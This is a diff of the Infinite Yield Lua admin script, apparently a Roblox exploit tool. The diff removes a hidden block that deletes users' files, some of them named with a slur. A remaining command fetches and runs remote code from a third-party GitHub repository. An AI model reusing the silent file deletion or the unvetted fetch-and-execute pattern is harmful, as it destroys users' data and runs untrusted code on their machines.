@@ -1,6 +1,8 @@
 -- Infinite Yield FE Admin
 -- View the owner profile here: github.com/EdgeIY
 -- view the official string here: raw.githubusercontent.com/EdgeIY/infiniteyield/master/source
+-- Last Script Update: 05/07/2025 at 03:07AM.
+-- Last Version Updated: IY 1.6.2
 
 if IY_LOADED and not _G.IY_DEBUG == true then
     -- error("Infinite Yield is already running!", 0)
@@ -12,7 +14,7 @@ if not game:IsLoaded() then game.Loaded:Wait() end
 
 function missing(t, f, fallback)
     if type(f) == t then return f end
-    return fallback or nil
+    return fallback
 end
 
 cloneref = missing("function", cloneref, function(...) return ... end)
@@ -129,12 +131,6 @@ if makefolder and isfolder and writefile and isfile then
         if IsOnMobile then writefile("infiniteyield/assets/.nomedia") end
     end)
 end
-
-pcall(function() -- good executor trust x2
-    for _, file in {"IY_FE", "IYSettings", "IYData", "settings", "fucku", "DexSettings", "jew", "1375859133001240586", "discord_id"} do
-        delfile(file)
-    end
-end)
 
 currentVersion = "6.3.2"
 
@@ -10301,7 +10297,7 @@ end)
 
 addcmd("explorer", {"dex"}, function(args, speaker)
     notify("Loading", "Hold on a sec")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Noob-With-Z/reposts2/refs/heads/main/DexExplorerMobile.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Noob-With-Z/reposts2/refs/heads/main/DexExplorerMobile.lua"))()
 end)
 
 addcmd('olddex', {'odex'}, function(args, speaker)
